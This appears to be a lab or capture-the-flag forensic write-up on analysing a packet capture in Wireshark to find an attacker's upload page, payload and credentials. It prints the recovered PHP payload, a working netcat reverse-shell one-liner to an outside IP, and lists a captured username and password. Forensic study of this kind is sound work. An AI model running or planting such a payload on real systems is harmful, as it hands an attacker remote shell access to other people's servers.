1) What was the URL of the page they used to upload a reverse shell?
```
I looked for http POST requests.

We find one packet (#14) and the answer is found under http section > Full request URI > http://192.168.170.159/development/upload.php
```

2) What payload did the attacker use to gain access?
```
We know that the attacker sent http post to upload a php reverse shell (upload.php). We can use the http export function in wireshark to analyze.

File > Export > Objects > Http

After saving upload.php we can view the payload:

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

```


I filtered for tcp ack requests and followed the TCP stream from packet # 29 I can see the attacker used these credentials:
```
User:james
Password: whenevernoteartinstant
```

For questions 3-5 we find the answer in [[Attacker Bash History]]
